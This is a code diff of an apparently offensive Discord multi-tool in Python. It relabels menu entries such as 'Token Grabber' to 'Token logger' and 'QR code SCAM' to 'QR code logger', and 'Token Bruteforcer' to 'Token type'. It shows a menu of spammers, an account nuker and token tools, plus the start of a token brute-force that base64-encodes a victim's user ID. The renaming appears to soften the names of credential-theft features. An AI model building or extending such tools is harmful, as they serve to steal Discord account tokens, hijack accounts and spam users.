@@ -219,9 +219,9 @@ def spammer():
     print(
         f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Friend Spammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[11]{Fore.RESET} Leaver            {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[19]{Fore.RESET} Account Nuker{Fore.RESET}{Fore.LIGHTMAGENTA_EX}    ║{Fore.RESET}')
     print(
-        f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Reaction Spam {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[12]{Fore.RESET} TokenChecker      {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[20]{Fore.RESET} Token Bruteforcer{Fore.RESET}{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+        f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Reaction Spam {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[12]{Fore.RESET} TokenChecker      {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[20]{Fore.RESET} Token type  {Fore.RESET}{Fore.LIGHTMAGENTA_EX}     ║{Fore.RESET}')
     print(
-        f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} WebhookSpammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[13]{Fore.RESET} Token Onliner     {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[21]{Fore.RESET} Token Grabber{Fore.RESET}{Fore.LIGHTMAGENTA_EX}    ║{Fore.RESET}')
+        f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} WebhookSpammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[13]{Fore.RESET} Token Onliner     {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[21]{Fore.RESET} Token logger {Fore.RESET}{Fore.LIGHTMAGENTA_EX}    ║{Fore.RESET}')
     print(
         f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Typing Spammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[14]{Fore.RESET} HypeSquad Joiner  {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[22]{Fore.RESET} Group Spammer{Fore.RESET}{Fore.LIGHTMAGENTA_EX}    ║{Fore.RESET} ')
     print(
@@ -1764,7 +1764,7 @@ def spammer():
 
     if choice == '20':
 
-        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Do not do this without the permission of the person to who the bruteforce attack is conducted. ')
+        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Do not do this without the permission of the person to who the type attack is conducted. ')
 
         id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
         id_to_token = str(id_to_token)[2:-1]
@@ -1799,9 +1799,9 @@ def spammer():
         exit = spammer()
 
     if choice == '21':
-        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Do not do this without the permission of the person to who the Token Grabber is conducted.')
-        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} File token grabber')
-        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} QR code SCAM')
+        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Do not do this without the permission of the person to who the Token Logger is conducted.')
+        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Token Logger Builder')
+        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} QR code logger')
         coc = input('[?]> ')
 
         if coc == '1':
